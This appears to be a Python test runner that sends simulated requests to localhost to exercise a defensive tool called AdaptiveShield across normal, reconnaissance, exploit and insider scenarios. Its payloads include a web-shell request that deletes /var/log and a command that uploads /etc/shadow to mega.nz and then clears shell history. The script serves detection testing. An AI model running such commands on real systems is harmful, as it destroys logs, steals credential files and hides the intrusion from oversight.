import urllib.request
import urllib.error
import json
import time

def send_request(url, headers, method="GET", data=None):
    req = urllib.request.Request(url, headers=headers, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
        json_data = json.dumps(data).encode("utf-8")
        req.data = json_data
    try:
        with urllib.request.urlopen(req) as response:
            print(f"[{method}] {url} -> Success: {response.status}")
    except urllib.error.HTTPError as e:
        print(f"[{method}] {url} -> HTTP Error: {e.code}")
    except Exception as e:
        print(f"[{method}] {url} -> Connection Error: {e}")

print("=========================================================")
print("===   ADAPTIVESHIELD SCENARIOS SIMULATION RUNNER     ===")
print("=========================================================\n")

# --- SCENARIO 1: The Normal User (Safe Request) ---
print("--- SCENARIO 1: Normal User (Safe, External Client) ---")
normal_headers = {
    "x-mock-ip": "84.22.12.19"  # Public IP -> routes to External Classifier
}
# A simple GET request to a standard path
send_request("http://127.0.0.1/normal_path", normal_headers, method="GET")
time.sleep(1)

# --- SCENARIO 2: The External Sneaky Hacker (Recon -> Decoy Reroute) ---
print("\n--- SCENARIO 2: Sneaky Hacker (External Recon -> Trap Rerouting) ---")
hacker_headers = {
    "x-mock-ip": "198.51.100.42"  # Public IP -> routes to External Classifier
}
# Accessing sensitive configuration files (indicates Recon scan)
send_request("http://127.0.0.1/.git/config", hacker_headers, method="GET")
time.sleep(1)

# --- SCENARIO 3: The Destructive Threat (External APT -> Kernel Block) ---
print("\n--- SCENARIO 3: Destructive Threat (External Exploit -> OS Kernel Block) ---")
destructive_headers = {
    "x-mock-ip": "203.0.113.111"  # Public IP -> routes to External Classifier
}
# Sending a SQL injection or reverse shell signature that trigger extreme actions
send_request("http://127.0.0.1/admin/shell?cmd=rm+-rf+/var/log", destructive_headers, method="GET")
time.sleep(1)

# --- SCENARIO 4: The Malicious Insider (Internal Employee Audit) ---
print("\n--- SCENARIO 4: Malicious Insider (Internal Employee -> Score Escalation) ---")
insider_headers = {
    "x-mock-ip": "192.168.1.75",  # Private IP -> routes to Insider Classifier (RandomForest)
    "x-user-id": "dev_01",
    "x-user-role": "developer"
}

print("[Insider] Step A: Normal developer check-in")
send_request("http://127.0.0.1/normal_path", insider_headers, method="POST")
time.sleep(0.5)

print("[Insider] Step B: Unauthorized scope database download (starts scoring risk)")
send_request("http://127.0.0.1/hr/employees.csv", insider_headers, method="POST")
time.sleep(0.5)

print("[Insider] Step C: Exfiltration + audit log cover-up (triggers block)")
send_request("http://127.0.0.1/etc/shadow", insider_headers, method="POST", data={
    "command": "curl -F file=@/etc/shadow mega.nz/upload; history -c",
    "cloud_upload": True
})

print("\n=========================================================")
print("===             SIMULATION COMPLETED                  ===")
print("=========================================================")
